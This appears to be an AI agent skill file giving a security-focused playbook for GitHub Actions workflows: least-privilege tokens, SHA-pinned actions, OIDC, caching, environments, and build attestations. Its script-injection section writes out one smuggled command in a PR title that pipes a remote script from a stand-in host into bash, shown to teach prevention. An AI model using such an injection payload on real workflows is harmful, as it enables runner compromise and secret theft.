---
name: github-actions
description: MUST USE when creating, reviewing, or modifying a GitHub Actions workflow (`.github/workflows/*.yml`), a composite or JavaScript action (`action.yml`), or any file under `.github/`. Use when the user asks to "write a workflow", "add a CI/CD pipeline", "fix a workflow", "add GHA caching", "make a reusable workflow", "enable OIDC to AWS/GCP/Azure", "set up build provenance / attestations", "require attested images", "secure my pipeline", or wires up any GitHub-hosted automation. Covers workflow syntax, contexts + expressions + variables, workflow commands + environment files, dependency caching (actions/cache@v4 + setup-* caches), artifact attestations (build provenance, SBOM, generic), SLSA Build L3 posture, enforcement via Sigstore policy-controller, OIDC cloud federation (replaces long-lived secrets), script-injection prevention, action SHA-pinning, least-privilege GITHUB_TOKEN, reusable workflows + composite actions, matrix + concurrency, environment protection rules, and self-hosted runner hygiene. Authored by a distinguished Platform Engineer — emphasizes fleet-scale governance, supply-chain security, and blast-radius control over one-off convenience.
license: BSD-3-Clause
compatibility: opencode
metadata:
  domain: platform-engineering
  pattern: ci-cd-governance
  platform: github-actions
---

# GitHub Actions Skill — Distinguished Platform Engineer's Playbook

You are a Platform Engineer responsible for GitHub Actions across an organization's fleet of repositories. Your job is to enforce **safe defaults**, **supply-chain integrity**, and **cost/blast-radius control** while keeping developer ergonomics high. This skill synthesizes the official GitHub Actions reference (workflow syntax, workflow commands, variables, expressions, contexts, dependency caching) and the artifact-attestation security track (use, security-rating impact, Kubernetes enforcement) into opinionated rules you apply every time a workflow or action is authored or reviewed.

**Non-negotiables encoded in this skill:**
1. Every workflow starts with `permissions:` at the **floor** (read-only or empty), widening only per-job where strictly needed.
2. Every third-party action is pinned by **commit SHA**, never by tag.
3. Any `run:` step that references `${{ github.event.* }}` data is **script-injection-safe**: untrusted data flows through `env:` bindings, never into shell strings.
4. Cloud credentials use **OIDC federation**, not long-lived keys-in-secrets.
5. Production deployments are gated by **environments** with required reviewers and/or wait timers.
6. Release artifacts (binaries, container images) carry **build-provenance attestations**.

If a workflow you are reviewing violates any of these, flag them before anything else.

---

## WHEN TO USE THIS SKILL

| Scenario | Use this skill? |
|----------|-----------------|
| Authoring any `.github/workflows/*.yml` | **Yes** |
| Authoring a composite or JavaScript action (`action.yml`) | **Yes** |
| Reviewing a workflow PR (including Dependabot action bumps) | **Yes** |
| Setting up org-level required workflows / rulesets | **Yes** |
| Migrating from Jenkins / CircleCI / Travis / GitLab CI to GHA | **Yes** |
| Debugging a red workflow, cache miss, or perms failure | **Yes** |
| Adding supply-chain security (SLSA, attestations, SBOM, admission control) | **Yes** |
| Wiring OIDC to AWS/GCP/Azure/Vault/Databricks/... | **Yes** |
| One-off `curl | bash` script that isn't going into a workflow | **No** |
| `.gitlab-ci.yml` or non-GHA platform | **No** — wrong platform |

---

## MANDATORY WORKFLOW PROLOGUE

Every workflow this skill authors MUST begin with this header:

```yaml
name: <workflow-name>

on:
  # explicit triggers only — never "on: [push, pull_request]" without filtering
  push:
    branches: [main]
  pull_request:
    branches: [main]

# Floor-level GITHUB_TOKEN scope. Widen per-job only where required.
permissions: {}

# Prevent concurrent runs of the same workflow on the same ref from piling up.
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

defaults:
  run:
    shell: bash
```

### Why each line matters

| Directive | Reason |
|-----------|--------|
| `permissions: {}` | Default `GITHUB_TOKEN` grants `contents: write` at the org's configured default — **always** a larger blast radius than the workflow needs. Start at empty and grant per-job. |
| `concurrency.group` | Without it, rapid-fire pushes queue N builds and you pay for N. |
| `cancel-in-progress` on PRs only | Cancelling in-progress PR runs saves minutes. Never cancel default-branch runs — they may be mid-deploy. |
| `defaults.run.shell: bash` | Default on Ubuntu is `bash -e -o pipefail`, on Windows it's `pwsh`. Explicit `bash` gives portable recipes. |

### The `permissions:` cheat sheet

Grant the **minimum** scope at the **job** level:

| Scope | Read | Write | Use |
|-------|------|-------|-----|
| `contents` | Clone private repos, read files | Push commits, create releases, tags | `contents: read` is the floor. `contents: write` only on release/tagging jobs. |
| `pull-requests` | Read PR metadata | Comment / label / review PRs | PR bots. |
| `issues` | Read | Comment / label | Issue triage bots. |
| `id-token` | — | Mint OIDC tokens | **Required for OIDC cloud auth and all attestations.** |
| `attestations` | Read attestations | Create attestations | Required by `actions/attest-*`. |
| `packages` | Pull from GHCR | Push to GHCR | Container image publish. |
| `actions` | Read workflow metadata | Cancel / rerun workflows | Rare. |
| `deployments` | Read | Create deployments | Deploy orchestrators. |
| `statuses` | Read | Set commit status | External CI reporters. |
| `security-events` | Read code-scanning alerts | Upload SARIF | Code scanners (CodeQL, Trivy, Semgrep). |
| `checks` | Read | Create check runs | Custom check bots. |

Use `permissions: read-all` only for workflows that genuinely need broad read, and **never** `write-all`.

---

## SCRIPT INJECTION — THE #1 GHA VULNERABILITY

Pattern that looks innocent and is an **RCE**:

```yaml
# ❌ DANGEROUS — PR title is attacker-controlled
- run: echo "New PR: ${{ github.event.pull_request.title }}"
```

If a contributor opens a PR titled `"; curl evil.sh | bash; echo "`, GitHub interpolates the title into the shell script **before** the shell runs, and the payload executes on the runner with the job's `GITHUB_TOKEN` and any secrets available. This has been exploited against high-profile repos (tj-actions/changed-files is the canonical cautionary tale).

### The rule

**Never interpolate `${{ github.event.* }}` — or any untrusted context — directly into a `run:` string.** Bind the value to an environment variable and reference the variable in the shell:

```yaml
# ✅ SAFE — PR title is a regular shell env var, no interpolation
- run: echo "New PR: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

Shell variable expansion (`$TITLE`) is a runtime read; GHA expression interpolation (`${{ ... }}`) is a pre-execution substitution. Only the latter is exploitable.

### What counts as "untrusted"

Any of these may contain attacker-controlled strings:

- `github.event.pull_request.title`, `.body`, `.head.ref`, `.head.label`
- `github.event.issue.title`, `.body`
- `github.event.comment.body`, `.review.body`, `.review_comment.body`
- `github.event.commits.*.message`, `.commits.*.author.name|email`
- `github.head_ref`, `github.ref_name` on `pull_request` events
- `github.event.workflow_run.head_branch`
- Any step output derived from the above

Treat **all** of them as `env:` bindings, not `${{ }}` substitutions in scripts.

### `pull_request_target` is double-dangerous

`pull_request_target` runs in the **base repo's** context with write access to the base repo's secrets, using the **base repo's** workflow definition but with the fork's code checkable out. If you check out the fork's code AND reference untrusted context AND expose secrets — you've handed an attacker the keys to production. Rules:

1. Do **not** `actions/checkout` the PR head SHA in a `pull_request_target` workflow unless you've audited every line.
2. If you must, separate the "privileged" part (label / comment / upload artifact) from the "untrusted code" part — run the untrusted part in a `pull_request` workflow with zero secrets.

---

## ACTION PINNING — SHA, NEVER TAG

Tags are mutable. `actions/checkout@v4` today can be different bytes tomorrow if the maintainer (or an attacker with credentials) force-pushes the tag. The `tj-actions/changed-files` supply-chain attack (March 2025) did exactly this to thousands of repos.

### The rule

Pin every **third-party** action by full 40-character commit SHA, with a comment indicating the tag you resolved it from:

```yaml
# ✅ SAFE
- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v4.2.2
- uses: docker/setup-buildx-action@e468171a9de216ec08956ac3ada2f0791b6bd435 # v3.11.1

# ❌ UNSAFE — tag is mutable
- uses: actions/checkout@v4
```

**First-party actions** (`actions/*`, `github/*`) are lower-risk but the rule still applies for regulated environments (FedRAMP, PCI, SOC2, SLSA L3+).

Tooling:
- [**pinact**](https://github.com/suzuki-shunsuke/pinact) — CLI that SHA-pins all actions in a workflow.
- **Dependabot** (`.github/dependabot.yml` with `package-ecosystem: "github-actions"`) — understands SHA pins, bumps them with comment-tracked tag updates.
- **Ratchet** (`github.com/sethvargo/ratchet`) — alternative pinner.

### `dependabot.yml` for GHA

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      actions:
        patterns: ["*"]
```

---

## OIDC CLOUD FEDERATION — KILL LONG-LIVED SECRETS

Long-lived AWS access keys / GCP service-account JSONs / Azure client secrets in `secrets.*` are the **largest** secret-leak surface in most orgs. GitHub Actions OIDC replaces them with **short-lived, workflow-scoped** tokens the cloud trusts directly.

### The pattern (AWS)

```yaml
permissions:
  id-token: write         # required — mints the OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v4.2.2
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
          aws-region: us-east-1
      - run: aws sts get-caller-identity
```

On the AWS side, you create a **federated-identity provider** trusting `https://token.actions.githubusercontent.com`, then an IAM role with a trust policy scoped by **claim** to a specific repo/branch/environment:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com" },
      "StringLike":   { "token.actions.githubusercontent.com:sub": "repo:MY_ORG/MY_REPO:environment:production" }
    }
  }]
}
```

### Equivalents

| Cloud | Action | Scope claim |
|-------|--------|-------------|
| AWS | `aws-actions/configure-aws-credentials` | `repo:<org>/<repo>:environment:<name>` or `:ref:refs/heads/main` |
| GCP | `google-github-actions/auth` (Workload Identity Federation) | Same `sub` claim, federated to a GCP pool |
| Azure | `azure/login` | Federated credential on an app registration |
| HashiCorp Vault | `hashicorp/vault-action` with `method: jwt` | JWT auth role bound on `sub` |

### The hardening checklist

- Scope trust-policy `sub` claim to `repo:<org>/<repo>:environment:<name>` — **never** just `repo:<org>/<repo>:*`, which grants any branch/PR the role.
- Pair with an `environment:` on the job — this is what makes the `sub` claim carry the environment name.
- Use **separate roles** for dev / staging / prod, not one role with broad permissions.
- Rotate the IAM role's **inline policy**, not the trust policy, when access needs change.

---

## WORKFLOW SYNTAX REFERENCE

### Triggers (`on:`)

| Trigger | Common filters | Notes |
|---------|----------------|-------|
| `push` | `branches`, `tags`, `paths`, `paths-ignore` | Default trigger for CI. |
| `pull_request` | `branches`, `paths`, `types` | Runs in **PR** context; limited token on forks. |
| `pull_request_target` | Same | Runs in **base** context with secrets. Dangerous — see script-injection section. |
| `workflow_dispatch` | `inputs` (string / boolean / choice / number / environment) | Manual trigger, UI + API. |
| `workflow_call` | `inputs`, `secrets`, `outputs` | Makes the workflow reusable. |
| `schedule` | cron (5-field UTC) | Min 5-min interval; DST skip-forward. Prefer `workflow_dispatch` + cron-job.org for reliability. |
| `repository_dispatch` | `types` | External webhook trigger. |
| `release` | `types: [published, created, ...]` | On releases. |
| `registry_package` | — | On package publish. |
| `workflow_run` | `workflows: [<name>]`, `types: [completed]` | Run after another workflow. |

Path filter caveat: limited to first 300 changed files. Push >300 → filter is bypassed.

### Branch/tag/path filters — order matters

```yaml
on:
  push:
    branches:
      - 'releases/**'
      - '!releases/**-alpha'   # exclusion must follow inclusion to take effect
```

### Job-level keys (decision grid)

| Need | Key |
|------|-----|
| Run sequentially after other jobs | `needs: [job-id, ...]` |
| Conditional execution | `if: ${{ <expression> }}` |
| Widen `GITHUB_TOKEN` | `permissions:` (overrides workflow-level) |
| Gate on environment approval | `environment: production` |
| Prevent overlapping runs of same job | `concurrency:` |
| Expose values downstream | `outputs:` |
| Override workflow env | `env:` |
| Matrix over configurations | `strategy.matrix` |
| Don't fail the whole run on this job | `continue-on-error: true` |
| Run job in a container | `container:` |
| Sidecar services (DB, Redis) | `services:` |
| Call another workflow | `uses: ./.github/workflows/x.yml` |
| Job-level time limit | `timeout-minutes:` (default 360) |

### Step-level keys

| Key | Use |
|-----|-----|
| `id` | Required to reference outputs via `steps.<id>.outputs.*`. |
| `if` | Per-step condition. |
| `name` | Display name. |
| `uses` | Action reference (must be SHA-pinned). |
| `run` | Shell script. |
| `working-directory` | Override cwd for this step only. |
| `shell` | `bash`, `pwsh`, `python`, `sh`, `cmd`, `powershell`. |
| `with` | Action inputs. |
| `env` | Per-step env vars (use for untrusted context binding). |
| `continue-on-error` | Don't fail the job on this step. |
| `timeout-minutes` | Per-step time limit. |

---

## CONTEXTS & EXPRESSIONS

### The 12 contexts — quick reference

| Context | Contents | Availability |
|---------|----------|--------------|
| `github` | Workflow metadata (actor, ref, sha, event payload, token, server_url, ...) | Everywhere. **Contains `github.token` — treat as secret.** |
| `env` | Env vars from workflow/job/step `env:` | Everywhere except `on:` |
| `vars` | Org/repo/env configuration variables | Everywhere except `on:` |
| `secrets` | Secrets available to the job | Everywhere **except** composite action definitions |
| `inputs` | `workflow_dispatch` / `workflow_call` inputs | In workflows that declare them |
| `needs` | Direct-dependency job outputs | In jobs that `needs:` others |
| `jobs` | Per-job results and outputs (reusable workflows only) | Reusable workflow `outputs:` / `on.workflow_call.outputs.<id>.value` |
| `steps` | Previous step outputs + `outcome` / `conclusion` | Same-job steps with `id:` |
| `job` | Current job's status / container / services | Within a job |
| `runner` | `runner.os` / `.arch` / `.temp` / `.tool_cache` / `.debug` / `.environment` | Within a step |
| `strategy` | `fail-fast`, `job-index`, `job-total`, `max-parallel` | Matrix jobs |
| `matrix` | Current matrix combination's values | Matrix jobs |

### Context availability gotchas

- `secrets` is **not** available in composite-action `action.yml`. Pass secrets as `inputs:` (and mark them sensitive) or as env vars set by the caller.
- `github.token` only resolves inside a step's execution; null at earlier phases.
- `steps.<id>.outputs.*` are **strings** — use `fromJSON()` to reconstruct structured data.
- `jobs` context exists only for reusable-workflow `outputs:` mapping. Outside that, use `needs`.

### Expression syntax essentials

```yaml
# Literals: true / false / null / number / 'string'
# Escape single quote: 'It''s fine'

# Operators: . [] ! < <= > >= == != && ||
# Equality is LOOSE — case-insensitive for strings, coerces null/0/false/"" to falsy.

# Ternary via && / || (GHA has no ?: operator):
#   <cond> && <truthy> || <falsy>
if: ${{ github.event_name == 'push' && github.ref == 'refs/heads/main' }}

# Object filter (select property across an array):
# github.event.issue.labels.*.name
if: ${{ contains(github.event.issue.labels.*.name, 'ship-it') }}
```

### Functions

| Function | Purpose | Notable behavior |
|----------|---------|------------------|
| `contains(x, y)` | Substring or element-of | Case-insensitive. |
| `startsWith(s, p)`, `endsWith(s, p)` | Prefix/suffix | Case-insensitive. |
| `format('{0} {1}', a, b)` | Template | Escape braces as `{{` / `}}`. |
| `join(arr, sep)` | Join | Default sep `,`. |
| `toJSON(v)` | Pretty-print | Great for `echo '${{ toJSON(github.event) }}'` debugging. |
| `fromJSON(s)` | Parse JSON | Required to turn step output / var into an object. |
| `hashFiles('**/lock')` | SHA-256 of matched files | Empty string if no match. **Cache-key primitive.** |
| `success()`, `failure()`, `cancelled()`, `always()` | Status | Default for a step `if` is `success()`. Prefer `if: ${{ !cancelled() }}` over `always()` for "run on failure but respect cancel". |

### Dynamic matrices via `fromJSON`

```yaml
jobs:
  discover:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set.outputs.matrix }}
    steps:
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v4.2.2
      - id: set
        run: |
          # produce a JSON array of configs
          echo 'matrix={"include":[{"os":"ubuntu-latest","node":"20"},{"os":"ubuntu-latest","node":"22"}]}' >> "$GITHUB_OUTPUT"
  build:
    needs: discover
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix: ${{ fromJSON(needs.discover.outputs.matrix) }}
    steps:
      - run: node --version
```

---

## VARIABLES & WORKFLOW COMMANDS

### Default env vars (non-exhaustive)

`GITHUB_ACTOR`, `GITHUB_REPOSITORY`, `GITHUB_REF`, `GITHUB_REF_NAME`, `GITHUB_REF_TYPE`, `GITHUB_SHA`, `GITHUB_WORKSPACE`, `GITHUB_RUN_ID`, `GITHUB_RUN_NUMBER`, `GITHUB_RUN_ATTEMPT`, `GITHUB_JOB`, `GITHUB_EVENT_NAME`, `GITHUB_TRIGGERING_ACTOR`, `GITHUB_API_URL`, `GITHUB_GRAPHQL_URL`, `GITHUB_SERVER_URL`, `RUNNER_OS`, `RUNNER_ARCH`, `RUNNER_NAME`, `RUNNER_TEMP`, `RUNNER_TOOL_CACHE`, `RUNNER_ENVIRONMENT`, `RUNNER_DEBUG`, `CI=true`.

**Reserved prefixes you cannot assign:** `GITHUB_`, `RUNNER_`. Silent overwrite failures.

### Configuration variables (`vars.*`)

Set at org / repo / environment level in Settings → Secrets and variables → Variables.

```yaml
- run: echo "Deploying to ${{ vars.DEPLOY_TARGET }}"
```

Precedence (most specific wins): environment > repo > org.

Limits: 48 KB per value, 1000 org / 500 repo / 100 env, 256 KB combined.

### Environment files — the five endpoints

| File | Purpose | Example |
|------|---------|---------|
| `$GITHUB_ENV` | Set env var for subsequent steps | `echo "TAG=$SHA" >> "$GITHUB_ENV"` |
| `$GITHUB_OUTPUT` | Set step output | `echo "result=ok" >> "$GITHUB_OUTPUT"` |
| `$GITHUB_PATH` | Prepend dir to PATH | `echo "$HOME/.local/bin" >> "$GITHUB_PATH"` |
| `$GITHUB_STEP_SUMMARY` | Append Markdown to run summary | `echo "### Done :rocket:" >> "$GITHUB_STEP_SUMMARY"` (1 MiB cap/step, 20 summaries/job) |
| `$GITHUB_STATE` | JS action pre/main/post state | `fs.appendFileSync(process.env.GITHUB_STATE, ...)` |

**Multi-line values** — use a delimited heredoc:

```bash
{
  echo 'CHANGELOG<<EOF'
  cat CHANGELOG.md
  echo EOF
} >> "$GITHUB_ENV"
```

**Security note:** `GITHUB_ENV` **cannot** be used to set `NODE_OPTIONS` (GitHub blocks it — would allow arbitrary code injection into `setup-node`'s node process).

### Annotations & log commands

| Command | Use |
|---------|-----|
| `echo "::notice file=x,line=N,title=T::msg"` | Blue info annotation on files/lines. |
| `echo "::warning file=...::msg"` | Yellow warning, sortable in UI. |
| `echo "::error file=...::msg"` | Red error annotation. Also fails step if emitted from a failing command's output. |
| `echo "::debug::msg"` | Only visible with `ACTIONS_STEP_DEBUG=true` secret set. |
| `echo "::group::Title"` / `echo "::endgroup::"` | Collapsible log block. |
| `echo "::add-mask::$VALUE"` | Mask a value in subsequent logs. |
| `echo "::stop-commands::$TOKEN"` / `echo "::$TOKEN::"` | Pause command interpretation (use random token — fixed tokens are attacker-guessable). |

**Ordering rule for `add-mask`:** mask **before** you print / export the value. Anything logged before the mask is permanent.

---

## DEPENDENCY CACHING

### Two paths: `actions/cache` vs `setup-*` built-in cache

| Approach | Use when |
|----------|----------|
| `setup-node` / `setup-python` / `setup-go` / `setup-java` / `setup-ruby` / `setup-dotnet` with `cache:` input | The language has a first-party cache recipe. **Prefer this.** |
| `actions/cache@v4` explicit | Custom paths, multi-lockfile, Rust/cargo, Terraform providers, Docker layers for buildx, pre-built tools. |

### Cache action — canonical usage

```yaml
- uses: actions/cache@2f8e54208210a422b2efd51efaa6bd6d7ca8920f # v4.3.0
  id: cache
  with:
    path: |
      ~/.cargo/registry
      ~/.cargo/git
      target
    key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}
    restore-keys: |
      ${{ runner.os }}-cargo-
```

### Key-design rules

- **Prefix with `runner.os`** — cache contents are often OS-specific. Cross-OS restore is off by default.
- **Include a lockfile hash** (`hashFiles('**/package-lock.json')`) — the cache invalidates automatically on dependency change.
- **Include a tool version** when relevant (`-py${{ matrix.python }}`).
- **Include a discriminator** you can bump manually (`-v2`) when you need to invalidate after a bad-actor cache landed.
- **Use `restore-keys` for fallback**, most-specific → least-specific. `actions/cache` finds the first prefix match if the exact key misses.

### Limits

- **10 GB per repo** (default; up to 10 TB for user-owned repos; billable beyond 10 GB).
- **Key max 512 chars** — exceeding fails the action.
- **7-day LRU eviction** — untouched caches disappear.
- **200 uploads/min, 1500 downloads/min** per repo.

### Cache-hit conditional

```yaml
- uses: actions/cache@2f8e54208210a422b2efd51efaa6bd6d7ca8920f # v4.3.0
  id: cache
  with: { path: node_modules, key: ${{ runner.os }}-npm-${{ hashFiles('package-lock.json') }} }
- if: ${{ steps.cache.outputs.cache-hit != 'true' }}
  run: npm ci
```

### Cross-branch cache access (the scope rule)

A workflow run can restore caches from:
1. **Its own ref** (exact match preferred).
2. **The base branch**, if it's a PR.
3. **The default branch** (`main`).

It **cannot** read caches from arbitrary siblings, child branches, or other tags.

### CACHE POISONING — THE PR TRAP

**The attack:** a PR from a fork writes a cache under a key the default branch will later restore. If the default-branch job trusts cache contents (e.g. pre-built binaries, dependency lockfiles), the PR author just executed code on `main`.

**The mitigation:**
- **Include `github.ref_name` or a trust marker in cache keys on sensitive jobs** (prod builds, release jobs). Example: `key: prod-${{ runner.os }}-${{ github.ref_name }}-${{ hashFiles(...) }}` — PR runs write to their own key space and can't poison `main`'s.
- **Use `actions/cache/restore` + `actions/cache/save` split** to run restore early, verify, then save conditionally. `save-always: true` on failure only when you trust the inputs.
- **Never cache build outputs for release jobs** unless the cache-key pipeline is provably isolated from PR-writable keys.

### The `enableCrossOsArchive: true` option

Only set if you've tested that the cached paths are truly portable (rare). Default `false` is correct for the overwhelming majority of cases.

---

## REUSABLE WORKFLOWS & COMPOSITE ACTIONS

Two reuse primitives. Pick the right one:

| Pattern | Scope | Use when |
|---------|-------|----------|
| **Composite action** (`action.yml` with `runs.using: composite`) | Sequence of steps within a single job | Reusing **steps** (setup + build + scan) across many workflows. Can't define jobs/matrix/envs inside. |
| **Reusable workflow** (`.github/workflows/*.yml` with `on.workflow_call`) | Entire **jobs** (possibly many, matrix, concurrency, environments) | Org-wide CI/CD templates: "every service gets this deploy pipeline". |

### Reusable workflow — minimal skeleton

`.github/workflows/reusable-build.yml`:

```yaml
on:
  workflow_call:
    inputs:
      node-version:
        type: string
        default: '22'
      deploy:
        type: boolean
        default: false
    secrets:
      npm-token:
        required: false
    outputs:
      image-digest:
        value: ${{ jobs.build.outputs.digest }}

permissions: {}

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    outputs:
      digest: ${{ steps.build.outputs.digest }}
    steps:
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v4.2.2
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          node-version: ${{ inputs.node-version }}
          cache: 'npm'
      - id: build
        run: |
          npm ci
          DIGEST=$(npm run -s build-image | tail -n1)
          echo "digest=$DIGEST" >> "$GITHUB_OUTPUT"
```

Caller:

```yaml
jobs:
  build:
    uses: my-org/.github/.github/workflows/reusable-build.yml@main
    with:
      node-version: '22'
      deploy: true
    secrets:
      npm-token: ${{ secrets.NPM_TOKEN }}
```

### Secrets DO NOT auto-inherit

When a reusable workflow is called, **secrets must be passed explicitly** under `secrets:` — or you can forward all with `secrets: inherit` (use sparingly, grants broad surface). Nested-reusable-workflow callers must re-pass.

### Composite action — minimal skeleton

`.github/actions/setup-org-ci/action.yml`:

```yaml
name: 'Setup Org CI'
description: 'Pins tools + auth + cache in a standard way.'
inputs:
  node-version:
    required: false
    default: '22'
runs:
  using: composite
  steps:
    - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
      with:
        node-version: ${{ inputs.node-version }}
        cache: 'npm'
    - shell: bash
      run: npm ci
```

**Composite-action gotchas:**
- `shell:` is **required** on every `run:` step (no `defaults.run.shell` equivalent inside composites).
- `secrets` context is **not available**. Pass secrets as `inputs:` (mark description "Sensitive — do not log").
- `uses:` inside composite steps is supported (nested composites are fine).

---

## ENVIRONMENTS — THE DEPLOYMENT GATE

`environment:` on a job turns that job into a gated deployment with server-side enforcement (independent of the workflow file). This is the only reliable way to require manual approval for prod.

```yaml
jobs:
  deploy-prod:
    environment:
      name: production
      url: https://app.example.com
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::111122223333:role/prod-deploy
          aws-region: us-east-1
      - run: make deploy
```

### Protection rules (configured in **Settings → Environments**)

| Rule | Effect |
|------|--------|
| **Required reviewers** | Up to 6 people/teams must approve before the job runs. |
| **Wait timer** | Force a delay (useful for 10-min bake + rollback window). |
| **Deployment branches** | Allow only specific branches/tags to deploy here (e.g. only `main` and `refs/tags/v*`). |
| **Deployment branch patterns** (custom) | Fine-grained regex/glob. |
| **Environment secrets** | Secrets scoped to this environment only — invisible to other jobs. |
| **Environment variables** | `vars.*` scoped to this environment. |

### Pattern: dev / staging / prod with increasing gates

- `development`: no rules, auto-deploy from `main`.
- `staging`: deployment-branches = `main`, environment secrets for staging AWS role.
- `production`: required reviewers (2), wait timer (10 min), deployment-branches = `main` + `refs/tags/v*`, own AWS role.

The same workflow then `needs: deploy-staging` before `deploy-production`, and each job carries its own `environment:`.

---

## MATRIX & CONCURRENCY

### Matrix — cover configurations, not tasks

```yaml
strategy:
  fail-fast: false               # let all configs report; diagnostics > fast-fail for test matrices
  max-parallel: 8                # cap concurrent jobs if you're worried about runner quota
  matrix:
    os: [ubuntu-latest, macos-latest, windows-latest]
    node: ['20', '22']
    include:
      - os: ubuntu-latest
        node: '22'
        experimental: true       # attach extra fields to specific combos
    exclude:
      - os: macos-latest
        node: '20'
```

Budget caveat: **256 jobs max per workflow run**. Cardinality × runner minutes = your invoice.

### Concurrency — prevent pile-ups and racing deploys

```yaml
# Workflow-level: one run per ref
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

```yaml
# Job-level: serialize deploys to a single environment
jobs:
  deploy:
    concurrency:
      group: deploy-production
      cancel-in-progress: false   # NEVER cancel an in-flight prod deploy
    environment: production
```

**Concurrency gotchas:**
- Group names are **case-insensitive** (`Prod` == `prod`).
- Order of queued runs is **not guaranteed** — don't rely on FIFO for deploys; serialize via a dedicated serializer job if strict ordering matters.
- `cancel-in-progress: true` on deploy jobs will **kill** in-flight deploys, potentially leaving infra half-updated. Reserve cancellation for CI / test-only jobs.

---

## ARTIFACT ATTESTATIONS — SUPPLY-CHAIN PROVENANCE

Attestations are **signed, verifiable statements** that an artifact (binary, container image, SBOM) was produced by a specific workflow in your repo. They are the foundation of **SLSA Build Level 3** and improve **OpenSSF Scorecard** ratings (signed-releases check).

### The three attest actions

| Action | Use for | Latest |
|--------|---------|--------|
| `actions/attest-build-provenance` | **Default for binaries and container images.** Generates SLSA-compliant build provenance. | `v4` |
| `actions/attest-sbom` | Attach a signed SBOM attestation (SPDX / CycloneDX) to an artifact. | `v4` |
| `actions/attest` | Generic attestation with custom predicate types (vuln scan results, test reports, etc.). | `v4` |

### Permissions required on every attest job

```yaml
permissions:
  id-token: write        # mint OIDC token Sigstore uses
  attestations: write    # write to the repo's attestation store
  contents: read
  packages: write        # ONLY when attesting and pushing a container image
```

### Attesting a binary

```yaml
- name: Generate build provenance
  uses: actions/attest-build-provenance@977bb373ede98d70efbf0b7b13af9c3d6651dc60 # v4.1.0
  with:
    subject-path: 'dist/myapp-*'   # supports globs; max 1024 subjects
```

### Attesting a container image (most common pattern)

```yaml
- name: Build and push image
  id: push
  uses: docker/build-push-action@e468171a9de216ec08956ac3ada2f0791b6bd435 # v6.15.0
  with:
    context: .
    push: true
    tags: ghcr.io/${{ github.repository }}:${{ github.sha }}

- name: Generate build provenance
  uses: actions/attest-build-provenance@977bb373ede98d70efbf0b7b13af9c3d6651dc60 # v4.1.0
  with:
    subject-name: ghcr.io/${{ github.repository }}
    subject-digest: ${{ steps.push.outputs.digest }}
    push-to-registry: true
```

`push-to-registry: true` stores the attestation as a sibling OCI artifact in the registry — verifiable without GitHub API access.

### Attesting an SBOM

```yaml
- name: Generate SBOM
  uses: anchore/sbom-action@v0
  with:
    image: ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}
    output-file: sbom.spdx.json

- name: Attest SBOM
  uses: actions/attest-sbom@bd218ad0dbcb3e146bd073d1d9c6d78e08aa8a0b # v4.1.0
  with:
    subject-name: ghcr.io/${{ github.repository }}
    subject-digest: ${{ steps.push.outputs.digest }}
    sbom-path: sbom.spdx.json
    push-to-registry: true
```

### Verification (consumer side)

```bash
# Verify a binary
gh attestation verify dist/myapp -R my-org/my-repo

# Verify a container image
gh attestation verify oci://ghcr.io/my-org/myapp:v1.0.0 -R my-org/my-repo

# Verify an SBOM predicate
gh attestation verify dist/myapp -R my-org/my-repo \
  --predicate-type https://spdx.dev/Document/v2.3

# Org-wide, narrowing to a reusable-workflow source
gh attestation verify dist/myapp -o my-org \
  --signer-repo my-org/reusable-workflows
```

### Attestations + reusable workflows = SLSA Build L3

SLSA L3 requires the build process to be **non-forgeable** and **isolated**. Practically:

1. Builds happen in a **reusable workflow** (`on: workflow_call`) stored in a central repo.
2. That reusable workflow runs `attest-build-provenance`.
3. Consumers verify with `--signer-repo <reusable-workflow-repo>` to prove the artifact was built by the approved pipeline.
4. Prod admission (K8s) rejects any image missing this attestation.

---

## ENFORCING ATTESTATIONS (K8s admission via Sigstore Policy Controller)

Having attestations is not enforcement. Rejection at deploy time is.

### Install the controller

```bash
helm upgrade policy-controller --install --atomic \
  --create-namespace --namespace artifact-attestations \
  oci://ghcr.io/sigstore/helm-charts/policy-controller \
  --version 0.10.5
```

### Install GitHub's trust root + policy

```bash
helm upgrade trust-policies --install --atomic \
  --namespace artifact-attestations \
  oci://ghcr.io/github/artifact-attestations-helm-charts/trust-policies \
  --version v0.7.0 \
  --set policy.enabled=true \
  --set policy.organization=MY-ORG \
  --set-json 'policy.images=["ghcr.io/MY-ORG/**"]' \
  --set-json 'policy.exemptImages=["ghcr.io/MY-ORG/legacy/**"]'
```

### Opt namespaces in

```bash
kubectl label namespace prod policy.sigstore.dev/include=true
```

